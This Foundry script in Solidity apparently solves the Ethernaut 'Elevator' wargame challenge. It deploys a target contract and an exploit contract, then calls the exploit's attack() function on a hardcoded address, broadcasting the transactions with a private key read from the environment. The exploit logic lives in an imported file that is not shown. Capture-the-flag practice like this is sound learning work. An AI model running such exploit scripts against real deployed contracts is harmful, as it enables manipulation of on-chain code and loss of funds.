// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Elevator.sol";
import "../src/Elevator_exp.sol";
contract Elevator_Script is Script{

    uint256 deployer;
    Elevator e;
    Elevator_exp e_exp;
    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);
        e = new Elevator();
        // address payable e = payable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        // address payable e = payable(0x5FbDB2315678afecb367f032sd93F642f64180aa3);
        address payable e = payable(0x3D27C12ed33FFdF284A9eE5C546e4b0d5ccE8FF3);
        e_exp = new Elevator_exp();
        e_exp.attack(e);

        vm.stopBroadcast();
    }


    function run() public {

    }
}